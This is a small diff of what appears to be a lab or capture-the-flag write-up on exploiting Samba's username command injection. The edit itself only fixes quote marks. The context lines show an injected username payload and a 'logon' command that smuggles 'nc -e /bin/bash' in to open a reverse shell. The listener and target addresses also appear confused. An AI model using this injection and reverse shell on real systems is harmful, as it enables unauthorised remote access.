@@ -206,7 +206,7 @@ Copied to: /home/kali/16320.rb
 username = "/=`nohup " + payload.encoded + "`"
 ```
 
-+ `smbclient //10.10.10.3/tmp -N` and 'nc -lnvp 4444'
++ `smbclient //10.10.10.3/tmp -N` and `nc -lnvp 4444`
 ```
 logon "./=`nohup nc -e /bin/bash 10.10.10.3 4444`"
 ```
